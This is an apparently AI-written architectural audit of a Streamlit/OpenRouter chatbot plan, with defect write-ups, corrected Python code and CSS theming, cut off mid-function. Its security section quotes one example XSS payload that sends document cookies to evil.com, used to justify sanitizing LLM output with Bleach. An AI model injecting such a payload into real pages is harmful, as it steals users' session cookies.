

# Comprehensive Architectural Audit: The Neural Terminal

---

## 1. Deep Reasoning Chain — Executive Assessment

This is genuinely one of the better-architected Streamlit application plans I've encountered. The layered separation (domain/infrastructure/application), the circuit breaker pattern, and the event-driven cost tracking demonstrate mature architectural thinking. However, beneath the strong macro-architecture, there are **17 concrete defects** ranging from runtime crashes to silent data loss, plus a CSS injection strategy that will shatter on first contact with a Streamlit minor version bump.

My assessment: **architecturally sound, implementation-dangerous**. The plan reads like excellent design documentation written before the code was tested. What follows is the forensic breakdown.

---

## 2. Critical Defects (Will Crash at Runtime)

### DEFECT C-1: `TokenUsage.cost` — Property With Arguments

```python
# domain/models.py — BROKEN
@dataclass(frozen=True)
class TokenUsage:
    prompt_tokens: int
    completion_tokens: int
    total_tokens: int

    @property
    def cost(self, price_per_1k_prompt: Decimal, price_per_1k_completion: Decimal) -> Decimal:
        # ❌ Python properties cannot accept arguments.
        # Calling `usage.cost` raises TypeError immediately.
```

**Why this is catastrophic:** Every cost calculation path depends on this. The `CostTracker`, `ChatOrchestrator._calculate_cost`, and the telemetry UI all expect `TokenUsage` to participate in cost derivation. This is dead on arrival.

**Fix:**

```python
@dataclass(frozen=True)
class TokenUsage:
    prompt_tokens: int
    completion_tokens: int
    total_tokens: int

    def calculate_cost(
        self, 
        price_per_1k_prompt: Decimal, 
        price_per_1k_completion: Decimal
    ) -> Decimal:
        """Regular method — not a property."""
        prompt_cost = (Decimal(self.prompt_tokens) / 1000) * price_per_1k_prompt
        completion_cost = (Decimal(self.completion_tokens) / 1000) * price_per_1k_completion
        return prompt_cost + completion_cost
```

---

### DEFECT C-2: `database.py` — Missing Imports, Broken Event Listener

```python
# ❌ Column, Text, datetime never imported
# ❌ @event.listens_for(create_engine, "connect") targets the FUNCTION, not an ENGINE INSTANCE

from sqlalchemy import create_engine, event
# ...
@event.listens_for(create_engine, "connect")  # ← This listens on the FUNCTION object
def set_sqlite_pragma(dbapi_conn, connection_record):
    cursor = dbapi_conn.cursor()
    cursor.execute("PRAGMA foreign_keys=ON")
    cursor.close()
```

**Why this is catastrophic:** Foreign key constraints are *never enabled*. Every `ForeignKeyConstraint` in your schema is decorative. Orphaned messages, dangling `parent_conversation_id` references, and silent data corruption follow.

**Fix:**

```python
from datetime import datetime

from sqlalchemy import (
    JSON, Column, DateTime, Enum, ForeignKey, Integer, 
    Numeric, String, Text, Uuid, create_engine, event,
)
from sqlalchemy.orm import (
    DeclarativeBase, Session, relationship, 
    scoped_session, sessionmaker,
)

from neural_terminal.config import settings
from neural_terminal.domain.models import ConversationStatus, MessageRole


class Base(DeclarativeBase):
    pass


# Create engine FIRST
engine = create_engine(
    settings.database_url,
    connect_args={"check_same_thread": False},
    pool_pre_ping=True,
)


# Listen on the ENGINE INSTANCE, not the function
@event.listens_for(engine, "connect")
def set_sqlite_pragma(dbapi_conn, connection_record):
    cursor = dbapi_conn.cursor()
    cursor.execute("PRAGMA foreign_keys=ON")
    cursor.execute("PRAGMA journal_mode=WAL")  # Better concurrency
    cursor.close()
```

---

### DEFECT C-3: `repositories.py` — Context Manager Leak / Double-Free

```python
# ❌ This creates a NEW context manager each time — the original is never closed
def _get_session(self) -> Session:
    if self._session is not None:
        return self._session
    return get_db_session().__enter__()  # ← Orphaned context manager

def _close_session(self, session: Session) -> None:
    if self._owns_session:
        get_db_session().__exit__(None, None, None)  # ← DIFFERENT context manager
```

**Why this is catastrophic:** Every repository method that creates its own session leaks it. The `__exit__` call operates on a *new* `get_db_session()` invocation, not the one from `__enter__`. Under load, you exhaust SQLite's connection pool and deadlock.

**Fix — completely restructured:**

```python
from contextlib import contextmanager
from typing import Generator, List, Optional
from uuid import UUID

from sqlalchemy import select, update
from sqlalchemy.orm import Session

from neural_terminal.domain.models import (
    Conversation, ConversationStatus, Message, MessageRole, TokenUsage,
)
from neural_terminal.infrastructure.database import (
    ConversationORM, MessageORM, SessionLocal,
)


class SQLiteConversationRepository:
    """Thread-safe repository using scoped sessions."""

    @contextmanager
    def _session_scope(self) -> Generator[Session, None, None]:
        """Atomic unit of work."""
        session = SessionLocal()
        try:
            yield session
            session.commit()
        except Exception:
            session.rollback()
            raise
        finally:
            SessionLocal.remove()  # Critical for scoped_session cleanup

    def _to_domain(self, orm: ConversationORM) -> Conversation:
        return Conversation(
            id=orm.id,
            title=orm.title,
            model_id=orm.model_id,
            status=orm.status,
            created_at=orm.created_at,
            updated_at=orm.updated_at,
            total_cost=orm.total_cost or Decimal("0"),
            total_tokens=orm.total_tokens or 0,
            parent_conversation_id=orm.parent_conversation_id,
            tags=orm.tags or [],
        )

    def _message_to_domain(self, orm: MessageORM) -> Message:
        usage = None
        if orm.prompt_tokens is not None:
            usage = TokenUsage(
                prompt_tokens=orm.prompt_tokens,
                completion_tokens=orm.completion_tokens or 0,
                total_tokens=orm.total_tokens or 0,
            )
        return Message(
            id=orm.id,
            conversation_id=orm.conversation_id,
            role=orm.role,
            content=orm.content,
            token_usage=usage,
            cost=orm.cost,
            latency_ms=orm.latency_ms,
            model_id=orm.model_id,
            created_at=orm.created_at,
            metadata=orm.metadata or {},
        )

    def get_by_id(self, conversation_id: UUID) -> Optional[Conversation]:
        with self._session_scope() as session:
            result = session.execute(
                select(ConversationORM).where(ConversationORM.id == conversation_id)
            ).scalar_one_or_none()
            return self._to_domain(result) if result else None

    def get_messages(self, conversation_id: UUID) -> List[Message]:
        """THE MISSING METHOD — required by ChatOrchestrator."""
        with self._session_scope() as session:
            results = session.execute(
                select(MessageORM)
                .where(MessageORM.conversation_id == conversation_id)
                .order_by(MessageORM.created_at.asc())
            ).scalars().all()
            return [self._message_to_domain(r) for r in results]

    def save(self, conversation: Conversation) -> None:
        with self._session_scope() as session:
            orm = ConversationORM(
                id=conversation.id,
                title=conversation.title,
                model_id=conversation.model_id,
                status=conversation.status,
                created_at=conversation.created_at,
                updated_at=conversation.updated_at,
                total_cost=conversation.total_cost,
                total_tokens=conversation.total_tokens,
                parent_conversation_id=conversation.parent_conversation_id,
                tags=conversation.tags,
            )
            session.merge(orm)

    def add_message(self, message: Message) -> None:
        if message.conversation_id is None:
            raise ValueError("Message must belong to a conversation")

        with self._session_scope() as session:
            orm = MessageORM(
                id=message.id,
                conversation_id=message.conversation_id,
                role=message.role,
                content=message.content,
                prompt_tokens=message.token_usage.prompt_tokens if message.token_usage else None,
                completion_tokens=message.token_usage.completion_tokens if message.token_usage else None,
                total_tokens=message.token_usage.total_tokens if message.token_usage else None,
                cost=message.cost,
                latency_ms=message.latency_ms,
                model_id=message.model_id,
                metadata=message.metadata,
            )
            session.add(orm)

    def list_active(self, limit: int = 50, offset: int = 0) -> List[Conversation]:
        with self._session_scope() as session:
            results = session.execute(
                select(ConversationORM)
                .where(ConversationORM.status == ConversationStatus.ACTIVE)
                .order_by(ConversationORM.updated_at.desc())
                .limit(limit)
                .offset(offset)
            ).scalars().all()
            return [self._to_domain(r) for r in results]
```

---

### DEFECT C-4: Circuit Breaker + Async Generator Incompatibility

```python
# orchestrator.py — BROKEN
stream_gen = await self._circuit.call_async(
    self._openrouter.chat_completion,  # ← Returns AsyncGenerator
    messages=api_messages,
    model=conv.model_id,
    temperature=temperature,
    stream=True
)
```

```python
# circuit_breaker.py
async def call_async(self, func, *args, **kwargs) -> T:
    result = await func(*args, **kwargs)  # ← Cannot `await` an AsyncGenerator
    #                                        TypeError: object async_generator can't be used in 'await' expression
```

**Why this is catastrophic:** The circuit breaker attempts to `await` the result of `chat_completion`, but that method uses `yield` (it's an `async def` with `yield` = `AsyncGenerator`). You cannot `await` an async generator. The streaming path — the core feature — is completely broken.

**Fix — split connection from streaming:**

```python
# openrouter.py — restructured
class OpenRouterClient:

    async def chat_completion_stream(
        self,
        messages: List[Dict[str, str]],
        model: str,
        temperature: float = 0.7,
        max_tokens: Optional[int] = None,
    ) -> AsyncGenerator[Dict[str, Any], None]:
        """Yields chunks. Connection errors surface before first yield."""
        client = await self._get_client()

        payload = {
            "model": model,
            "messages": messages,
            "temperature": temperature,
            "stream": True,
        }
        if max_tokens:
            payload["max_tokens"] = max_tokens

        start_time = time.time()

        async with client.stream("POST", "/chat/completions", json=payload) as response:
            if response.status_code >= 400:
                body = await response.aread()
                raise OpenRouterAPIError(
                    message=f"OpenRouter error: {body.decode()}",
                    status_code=response.status_code,
                    response_body=body.decode(),
                )

            full_content = ""
            usage: Optional[TokenUsage] = None

            async for line in response.aiter_lines():
                if not line.startswith("data: "):
                    continue
                data = line[6:]
                if data == "[DONE]":
                    break

                try:
                    chunk = json.loads(data)
                    delta = chunk.get("choices", [{}])[0].get("delta", {})
                    content = delta.get("content", "")

                    if content:
                        full_content += content
                        yield {"type": "delta", "content": content}

                    if "usage" in chunk:
                        u = chunk["usage"]
                        usage = TokenUsage(
                            prompt_tokens=u.get("prompt_tokens", 0),
                            completion_tokens=u.get("completion_tokens", 0),
                            total_tokens=u.get("total_tokens", 0),
                        )
                except json.JSONDecodeError:
                    continue

            latency = int((time.time() - start_time) * 1000)
            yield {
                "type": "final",
                "content": full_content,
                "usage": usage,
                "latency_ms": latency,
                "model": model,
            }
```

```python
# orchestrator.py — fixed streaming
async def send_message(self, conversation_id, content, temperature=0.7):
    # ... setup code ...
    
    # Protect the CONNECTION with circuit breaker, not the stream
    try:
        self._circuit._check_state()  # Manual state check
    except CircuitBreakerOpenError:
        raise

    try:
        async for chunk in self._openrouter.chat_completion_stream(
            messages=api_messages,
            model=conv.model_id,
            temperature=temperature,
        ):
            if chunk["type"] == "delta":
                self._event_bus.emit(DomainEvent(
                    event_type=Events.TOKEN_GENERATED,
                    conversation_id=conversation_id,
                    payload={"delta": chunk["content"]}
                ))
                yield (chunk["content"], None)

            elif chunk["type"] == "final":
                self._circuit._on_success()  # Record success
                # ... persist message, emit events ...
                yield ("", metadata)

    except Exception as e:
        self._circuit._on_failure()  # Record failure
        raise
```

---

### DEFECT C-5: `openrouter.py` — Missing `import json`

```python
# ❌ json.loads(data) called but json never imported
chunk = json.loads(data)  # NameError: name 'json' is not defined
```

Trivial but fatal. Add `import json` to the imports.

---

### DEFECT C-6: `CostTracker` Creates Orphan `EventBus` Instances

```python
# cost_tracker.py — BROKEN
def _check_budget(self, estimated_cost: Decimal):
    # ...
    from neural_terminal.application.events import EventBus
    bus = EventBus()  # ← NEW instance. No subscribers. Events go nowhere.
    bus.emit(DomainEvent(...))
```

**Why this is catastrophic:** Budget threshold and budget exceeded events are emitted into a void. The user never sees the $5 limit warning. They keep chatting until OpenRouter bills them.

**Fix — inject the bus:**

```python
class CostTracker(EventObserver):
    def __init__(self, event_bus: EventBus, budget_limit: Optional[Decimal] = None):
        self._bus = event_bus  # ← Use the shared instance
        self._accumulated = Decimal("0.00")
        self._budget_limit = budget_limit
        # ...

    def _check_budget(self, estimated_cost: Decimal):
        if not self._budget_limit:
            return
        projected = self._accumulated + estimated_cost
        if projected > self._budget_limit:
            self._bus.emit(DomainEvent(
                event_type=Events.BUDGET_EXCEEDED,
                payload={"accumulated": str(self._accumulated)}
            ))
        elif projected > self._budget_limit * Decimal("0.8"):
            self._bus.emit(DomainEvent(
                event_type=Events.BUDGET_THRESHOLD,
                payload={
                    "accumulated": str(self._accumulated),
                    "limit": str(self._budget_limit),
                }
            ))
```

---

### DEFECT C-7: Unit Test Will Always Fail

```python
# test_circuit_breaker.py — BROKEN
def test_circuit_opens_after_threshold():
    cb = CircuitBreaker(failure_threshold=2)

    def fail():
        raise ValueError("error")

    cb.call(fail)  # ← Raises ValueError — test crashes HERE
    cb.call(fail)  # ← Never reached
```

**Fix:**

```python
def test_circuit_opens_after_threshold():
    cb = CircuitBreaker(failure_threshold=2)

    def fail():
        raise ValueError("error")

    with pytest.raises(ValueError):
        cb.call(fail)  # 1st failure — exception propagates

    with pytest.raises(ValueError):
        cb.call(fail)  # 2nd failure — circuit opens

    with pytest.raises(CircuitBreakerOpenError):
        cb.call(fail)  # 3rd call — rejected by open circuit
```

---

## 3. High-Severity Design Issues

### ISSUE H-1: `Conversation.update_cost` Uses `object.__setattr__` Unnecessarily

```python
@dataclass
class Conversation:
    # NOT frozen — regular dataclass
    def update_cost(self, message_cost: Decimal) -> None:
        object.__setattr__(self, 'total_cost', self.total_cost + message_cost)
        # ↑ This bypass is only needed for frozen=True dataclasses
```

This is misleading. The `Conversation` dataclass is **not** frozen, so `self.total_cost += message_cost` works fine. Using `object.__setattr__` implies immutability semantics that don't exist, confusing future maintainers.

---

### ISSUE H-2: `CircuitBreaker` Is Not Thread-Safe

The docstring says "Thread-safe" but there are no locks. In Streamlit's multi-session environment, concurrent requests can produce race conditions on `_failure_count` and `_state`.

```python
import threading

class CircuitBreaker:
    def __init__(self, failure_threshold=5, recovery_timeout=30):
        self._lock = threading.Lock()
        # ...

    def _on_failure(self) -> None:
        with self._lock:
            self._failure_count += 1
            self._last_failure_time = time.time()
            if self._failure_count >= self.failure_threshold:
                self._state = CircuitState.OPEN

    def _on_success(self) -> None:
        with self._lock:
            self._failure_count = 0
            self._state = CircuitState.CLOSED
```

---

### ISSUE H-3: `asyncio.run()` Inside Streamlit Is Dangerous

```python
# app.py
models = asyncio.run(orchestrator.load_models())  # ❌
```

Streamlit ≥1.28 runs its own async event loop internally. Calling `asyncio.run()` creates a *new* loop, which can conflict. Additionally, `asyncio.run()` cannot be called when a loop is already running (raises `RuntimeError`).

**Fix:**

```python
import asyncio
import nest_asyncio

nest_asyncio.apply()  # Allow nested event loops

# Or preferably, restructure to use synchronous wrappers:
def _run_async(coro):
    """Safe async execution within Streamlit."""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor() as pool:
                return pool.submit(asyncio.run, coro).result()
        else:
            return loop.run_until_complete(coro)
    except RuntimeError:
        return asyncio.run(coro)
```

---

### ISSUE H-4: `state.py` — `Conversation` Has No `to_dict()` Method

```python
# state.py
def set_conversation(self, conversation: Conversation) -> None:
    st.session_state[cache_key][str(conversation.id)] = conversation.to_dict()
    # ❌ Conversation is a dataclass but has no to_dict() method
```

`dataclasses.asdict` exists, but it's not called. Either add the method or use `asdict`:

```python
from dataclasses import asdict

def set_conversation(self, conversation: Conversation) -> None:
    cache_key = f"{self._NAMESPACE}conversation_cache"
    if cache_key not in st.session_state:
        st.session_state[cache_key] = {}
    
    # Serialize properly — Decimal and UUID need special handling
    conv_data = asdict(conversation)
    conv_data["id"] = str(conversation.id)
    conv_data["total_cost"] = str(conversation.total_cost)
    conv_data["parent_conversation_id"] = (
        str(conversation.parent_conversation_id)
        if conversation.parent_conversation_id else None
    )
    st.session_state[cache_key][str(conversation.id)] = conv_data
```

---

### ISSUE H-5: Missing `get_messages` Repository Method

The `ChatOrchestrator.send_message` calls `self._get_messages_for_context(conv.id)` which is a placeholder returning `[]`. The repository abstract class has no `get_messages` method. **Every conversation sends only the current message with no history.** Context-aware chat is non-functional.

This was addressed in my corrected `SQLiteConversationRepository` above (Defect C-3 fix).

---

### ISSUE H-6: SQLAlchemy `Uuid` Column Type + SQLite Compatibility

```python
id = Column(Uuid(as_uuid=True), primary_key=True)
```

SQLAlchemy's `Uuid` type was added in 2.0 but SQLite stores UUIDs as strings (CHAR(32)). While SQLAlchemy handles the conversion, you need to ensure consistent string formatting. Consider:

```python
from sqlalchemy import TypeDecorator, String
import uuid

class SQLiteUUID(TypeDecorator):
    """Platform-independent UUID type for SQLite."""
    impl = String(36)
    cache_ok = True

    def process_bind_param(self, value, dialect):
        if value is not None:
            return str(value)
        return value

    def process_result_value(self, value, dialect):
        if value is not None:
            return uuid.UUID(value)
        return value
```

---

## 4. Security Audit

### VULN S-1: XSS in `render_message_bubble` (CRITICAL)

```python
def render_message_bubble(role, content, cost=None, latency=None):
    html = f"""
    <div style="...">
        {content}  ← ❌ UNSANITIZED LLM OUTPUT INJECTED INTO HTML
    </div>
    """
    st.markdown(html, unsafe_allow_html=True)
```

An LLM can be prompt-injected to return `<script>document.location='https://evil.com?c='+document.cookie</script>`. The plan *mentions* Bleach sanitization but **never implements it**.

**Fix:**

```python
import bleach

ALLOWED_TAGS = ["code", "pre", "b", "i", "em", "strong", "br", "p", "ul", "ol", "li"]
ALLOWED_ATTRS = {"code": ["class"]}

def sanitize_content(content: str) -> str:
    """Sanitize LLM output before HTML injection."""
    return bleach.clean(
        content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True,
    )

def render_message_bubble(role: str, content: str, **kwargs):
    safe_content = sanitize_content(content)
    # ... render with safe_content ...
```

---

### VULN S-2: No Input Length Validation

Users can submit megabyte-length messages. There's no `max_length` on the input, no pre-flight validation in `ChatOrchestrator.send_message`.

```python
# Add to orchestrator
MAX_INPUT_LENGTH = 32_000  # characters

async def send_message(self, conversation_id, content, temperature=0.7):
    if len(content) > MAX_INPUT_LENGTH:
        raise ValidationError(
            f"Message exceeds maximum length ({MAX_INPUT_LENGTH} chars)"
        )
    if not content.strip():
        raise ValidationError("Empty message")
    # ...
```

---

## 5. Streamlit-Specific Pitfalls

### PITFALL ST-1: CSS Selectors Targeting Internal DOM Structure

```css
.stVerticalBlock > div:nth-child(2) {
    grid-column: 1;
    grid-row: 2;
    /* ... */
}
```

Streamlit's internal DOM structure (`stVerticalBlock`, `stHorizontalBlock`) is **not part of their public API**. These class names change between minor versions. The `data-testid` attributes are slightly more stable but still not guaranteed.

**Mitigation strategy:**

```python
# Instead of fighting Streamlit's layout, work WITH it
# Use st.columns for the primary grid and inject CSS only for theming

def render_layout():
    # Three-column layout using Streamlit primitives
    chat_col, telemetry_col = st.columns([3, 1], gap="small")
    
    with chat_col:
        render_chat_canvas()
    
    with telemetry_col:
        render_telemetry_panel()
```

Then apply CSS theming *only* to known stable selectors:

```css
/* Target by data-testid (more stable) or inject wrapper divs */
[data-testid="stAppViewContainer"] {
    background-color: var(--void-black);
}

[data-testid="stMetric"] {
    background-color: var(--void-elevated);
}

/* Custom wrapper approach — YOU control the class names */
.neural-message-block {
    border-left: 2px solid var(--phosphor-green);
    padding-left: 1rem;
}
```

---

### PITFALL ST-2: `st.session_state` Storing Complex Objects

```python
st.session_state.orchestrator = orchestrator  # Contains httpx.AsyncClient
```

Storing `OpenRouterClient` (which holds `httpx.AsyncClient`) in session state is fragile. The client may be garbage-collected, its connection pool may expire, or Streamlit may attempt to serialize it during state persistence.

**Fix — use a factory pattern:**

```python
@st.cache_resource
def get_openrouter_client() -> OpenRouterClient:
    """Singleton across all sessions. Connection-pooled."""
    return OpenRouterClient()

@st.cache_resource
def get_orchestrator() -> ChatOrchestrator:
    """Singleton service layer."""
    return ChatOrchestrator(
        repository=SQLiteConversationRepository(),
        openrouter=get_openrouter_client(),
        event_bus=EventBus(),
        token_counter=TokenCounter(),
    )
```

`@st.cache_resource` is designed for exactly this — caching non-serializable singletons.

---

### PITFALL ST-3: Font Loading Flash

```python
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono...');
</style>
""")
```

This re-fetches fonts on *every* Streamlit rerun (every interaction). It causes a flash of unstyled text (FOUT) and adds ~200ms latency per rerun.

**Fix — use `st.set_page_config` + preconnect:**

```python
# Inject in <head> via components
import streamlit.components.v1 as components

def inject_fonts():
    components.html("""
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Space+Grotesk:wght@300;500;700&display=swap" rel="stylesheet">
    """, height=0)
```

Or better, self-host the font files and serve them via Streamlit's static file serving.

---

## 6. Frontend Strategy Critique

### The Space Grotesk Contradiction

The design system specifies `--font-ui: 'Space Grotesk'` — the exact font the prompt's own guidelines list as an overused "common choice." Given the "Research Terminal" aesthetic, consider:

- **IBM Plex Mono** — designed for terminal interfaces, carries IBM research DNA
- **Iosevka** — highly customizable, ligature-rich, genuinely distinct
- **Berkeley Mono** — premium, but the aesthetic reference is perfect
- **For the UI font:** **Instrument Sans** or **General Sans** — less saturated than Space Grotesk while maintaining geometric clarity

### The Bento Grid Reality

The plan's CSS Grid override is architecturally brave but operationally fragile. Here's the honest assessment:

| Approach | Reliability | Aesthetic Control | Maintenance Cost |
|---|---|---|---|
| CSS Grid on `.block-container` | Low (breaks on version bumps) | High | Very High |
| `st.columns` + CSS theming | High | Medium | Low |
| `st.components.v1.html` for full custom layout | Medium | Very High | Medium |
| Hybrid: `st.columns` grid + `html` components for custom blocks | High | High | Medium |

**My recommendation: Hybrid approach.** Use `st.columns` for the macro layout, then inject custom HTML components for the bespoke elements (message renderer, telemetry gauges, token counters). This gives you 80% of the aesthetic vision with 20% of the maintenance burden.

---

## 7. Consolidated Corrected Architecture

Here is a single, corrected `app.py` that integrates the fixes above and demonstrates the proper initialization pattern:

```python
# src/neural_terminal/app.py — CORRECTED
"""
Neural Terminal v0.2.0
Production-grade Streamlit chatbot with OpenRouter integration.
"""
import asyncio
import threading
from datetime import datetime
from decimal import Decimal
from uuid import UUID

import streamlit as st

from neural_terminal.application.cost_tracker import CostTracker
from neural_terminal.application.events import EventBus, Events
from neural_terminal.application.orchestrator import ChatOrchestrator
from neural_terminal.application.state import StateManager
from neural_terminal.config import settings
from neural_terminal.domain.models import Conversation, MessageRole
from neural_terminal.infrastructure.database import Base, engine
from neural_terminal.infrastructure.openrouter import OpenRouterClient
from neural_terminal.infrastructure.repositories import SQLiteConversationRepository
from neural_terminal.infrastructure.token_counter import TokenCounter


# ─── Singleton Services ───────────────────────────────────────────

@st.cache_resource
def init_database():
    """Create tables if not exist. Runs once."""
    Base.metadata.create_all(bind=engine)
    return True


@st.cache_resource
def get_event_bus() -> EventBus:
    return EventBus()


@st.cache_resource
def get_openrouter() -> OpenRouterClient:
    return OpenRouterClient()


@st.cache_resource
def get_orchestrator(
    _event_bus: EventBus,
    _openrouter: OpenRouterClient,
) -> ChatOrchestrator:
    return ChatOrchestrator(
        repository=SQLiteConversationRepository(),
        openrouter=_openrouter,
        event_bus=_event_bus,
        token_counter=TokenCounter(),
    )


def get_cost_tracker(event_bus: EventBus) -> CostTracker:
    """Per-session cost tracker."""
    if "cost_tracker" not in st.session_state:
        tracker = CostTracker(
            event_bus=event_bus,
            budget_limit=Decimal("5.00"),
        )
        event_bus.subscribe(Events.MESSAGE_STARTED, tracker)
        event_bus.subscribe(Events.TOKEN_GENERATED, tracker)
        event_bus.subscribe(Events.MESSAGE_COMPLETED, tracker)
        st.session_state.cost_tracker = tracker
    return st.session_state.cost_tracker


# ─── Async Bridge ─────────────────────────────────────────────────

def run_async(coro):
    """Execute async coroutine safely within Streamlit."""
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = None

    if loop and loop.is_running():
        # We're inside an existing loop — run in thread
        result = [None]
        exception = [None]

        def target():
            try:
                result[0] = asyncio.run(coro)
            except Exception as e:
                exception[0] = e

        t = threading.Thread(target=target)
        t.start()
        t.join()

        if exception[0]:
            raise exception[0]
        return result[0]
    else:
        return asyncio.run(coro)


# ─── CSS Theme ────────────────────────────────────────────────────

def inject_theme():
    st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;700&family=Instrument+Sans:wght@400;500;700&display=swap');

    :root {
        --void: #07070d;
        --void-surface: #0e0e16;
        --void-elevated: #16161f;
        --phosphor: #00ff41;
        --phosphor-dim: #00b330;
        --amber: #ffb000;
        --danger: #ff3333;
        --ash: #555;
        --text: #c8c8c8;
        --mono: 'IBM Plex Mono', monospace;
        --sans: 'Instrument Sans', sans-serif;
    }

    #MainMenu, footer, header { visibility: hidden; }

    [data-testid="stAppViewContainer"] {
        background: var(--void);
        color: var(--text);
        font-family: var(--sans);
    }

    [data-testid="stSidebar"] {
        background: var(--void-surface);
        border-right: 1px solid var(--void-elevated);
    }

    [data-testid="stSidebar"] [data-testid="stMarkdown"] {
        color: var(--ash);
    }

    .stTextInput > div > div > input {
        background: var(--void-surface) !important;
        color: var(--phosphor) !important;
        border: 1px solid var(--void-elevated) !important;
        border-radius: 2px !important;
        font-family: var(--mono) !important;
        font-size: 0.875rem !important;
        caret-color: var(--phosphor) !important;
    }

    .stTextInput > div > div > input:focus {
        border-color: var(--phosphor) !important;
        box-shadow: 0 0 8px rgba(0, 255, 65, 0.15) !important;
    }

    .stButton > button {
        background: transparent !important;
        color: var(--phosphor) !important;
        border: 1px solid var(--phosphor-dim) !important;
        border-radius: 2px !important;
        font-family: var(--mono) !important;
        font-size: 0.7rem !important;
        text-transform: uppercase !important;
        letter-spacing: 0.15em !important;
        transition: all 120ms ease !important;
    }

    .stButton > button:hover {
        background: var(--phosphor) !important;
        color: var(--void) !important;
        box-shadow: 0 0 12px rgba(0, 255, 65, 0.25) !important;
    }

    .stSelectbox > div > div {
        background: var(--void-surface) !important;
        color: var(--text) !important;
        border: 1px solid var(--void-elevated) !important;
        font-family: var(--mono) !important;
        font-size: 0.8rem !important;
    }

    [data-testid="stMetricValue"] {
        color: var(--phosphor) !important;
        font-family: var(--mono) !important;
    }

    [data-testid="stMetricLabel"] {
        color: var(--ash) !important;
        font-size: 0.65rem !important;
        text-transform: uppercase !important;
        letter-spacing: 0.08em !important;
    }

    /* Scrollbar */
    ::-webkit-scrollbar { width: 4px; }
    ::-webkit-scrollbar-track { background: var(--void); }
    ::-webkit-scrollbar-thumb { background: var(--void-elevated); border-radius: 1px; }
    ::-webkit-scrollbar-thumb:hover { background: var(--phosphor-dim); }

    /* Message animations */
    @keyframes msg-enter {
        from { opacity: 0; transform: translateY(6px); }
        to { opacity: 1; transform: translateY(0); }
    }

    @keyframes cursor-blink {
        0%, 50% { opacity: 1; }
        51%, 100% { opacity: 0; }
    }

    @keyframes scanline {
        0% { transform: translateY(-100%); }
        100% { transform: translateY(100vh); }
    }
    </style>
    """, unsafe_allow_html=True)


# ─── Components ───────────────────────────────────────────────────

def render_header():
    state = StateManager().state
    st.markdown(f"""
    <div style="
        display: flex; 
        justify-content: space-between; 
        align-items: baseline;
        border-bottom: 1px solid var(--void-elevated);
        padding-bottom: 1rem;
        margin-bottom: 1.5rem;
    ">
        <div>
            <div style="
                font-family: var(--mono); 
                color: var(--phosphor); 
                font-size: 1.25rem; 
                font-weight: 700;
                letter-spacing: -0.03em;
            ">
                NEURAL TERMINAL
                <span style="
                    color: var(--amber); 
                    font-size: 0.6em; 
                    font-weight: 400;
                    margin-left: 0.5rem;
                ">[v0.2 // STREAMING]</span>
            </div>
            <div style="
                font-family: var(--sans); 
                color: var(--ash); 
                font-size: 0.7rem; 
                margin-top: 0.25rem;
            ">
                OPENROUTER INTEGRATION &mdash; {state.selected_model}
            </div>
        </div>
        <div style="
            font-family: var(--mono); 
            color: var(--ash); 
            font-size: 0.65rem; 
            text-align: right;
        ">
            COST: <span style="color: var(--amber);">${float(state.accumulated_cost):.4f}</span>
        </div>
    </div>
    """, unsafe_allow_html=True)


def render_message(role: str, content: str, cost=None, latency=None):
    """Render a single message with brutalist log-entry aesthetic."""
    import bleach

    safe_content = bleach.clean(
        content,
        tags=["code", "pre", "b", "i", "em", "strong", "br", "p", "ul", "ol", "li"],
        attributes={"code": ["class"]},
        strip=True,
    )

    is_user = role == MessageRole.USER or role == "user"
    accent = "var(--amber)" if is_user else "var(--phosphor)"
    label = "YOU" if is_user else "TERMINAL"
    icon = "▸" if is_user else "◂"
    text_color = "var(--text)" if is_user else "var(--phosphor)"

    meta = ""
    if cost or latency:
        parts = []
        if cost:
            parts.append(f'<span style="color: var(--amber);">${float(cost):.5f}</span>')
        if latency:
            parts.append(f'<span>{latency}ms</span>')
        meta = f"""
        <div style="
            display: flex; gap: 1rem; 
            font-size: 0.6rem; color: var(--ash); 
            margin-bottom: 0.25rem; font-family: var(--mono);
        ">{''.join(parts)}</div>
        """

    st.markdown(f"""
    <div style="
        margin-bottom: 1.25rem;
        border-left: 2px solid {accent};
        padding-left: 0.875rem;
        animation: msg-enter 0.25s ease;
    ">
        <div style="
            display: flex; align-items: baseline; gap: 0.5rem; 
            margin-bottom: 0.2rem;
        ">
            <span style="
                color: {accent}; 
                font-weight: 700; 
                font-size: 0.7rem; 
                font-family: var(--mono);
            ">{icon} {label}</span>
            <span style="color: #333; font-size: 0.55rem; font-family: var(--mono);">
                {datetime.now().strftime('%H:%M:%S')}
            </span>
        </div>
        {meta}
        <div style="
            color: {text_color}; 
            font-size: 0.85rem; 
            line-height: 1.65; 
            font-family: var(--mono);
            white-space: pre-wrap;
        ">{safe_content}</div>
    </div>
    """, unsafe_allow_html=True)


def render_empty_state():
    st.markdown("""
    <div style="
        display: flex; flex-direction: column; 
        align-items: center; justify-content: center;
        height: 50vh; text-align: center;
    ">
        <div style="
            font-family: var(--mono); 
            color: var(--phosphor); 
            font-size: 0.9rem; 
            margin-bottom: 1rem;
            opacity: 0.7;
        ">AWAITING TRANSMISSION</div>
        <div style="
            font-family: var(--sans); 
            color: var(--ash); 
            font-size: 0.75rem; 
            max-width: 320px;
            line-height: 1.6;
        ">
            Initialize a connection to begin. 
            All transmissions are logged with cost and latency telemetry.
        </div>
    </div>
    """, unsafe_allow_html=True)


# ─── Main Application ────────────────────────────────────────────

def main():
    st.set_page_config(
        page_title="Neural Terminal",
        page_icon="⚡",
        layout="wide",
        initial_sidebar_state="expanded",
    )

    # Infrastructure
    init_database()
    inject_theme()

    event_bus = get_event_bus()
    openrouter = get_openrouter()
    orchestrator = get_orchestrator(event_bus, openrouter)
    cost_tracker = get_cost_tracker(event_bus)
    state_mgr = StateManager()

    # Layout
    render_header()

    # ─── Sidebar: Telemetry ──────────────────────────
    with st.sidebar:
        st.markdown("""
        <div style="
            font-family: var(--mono); 
            color: var(--phosphor-dim); 
            font-size: 0.7rem; 
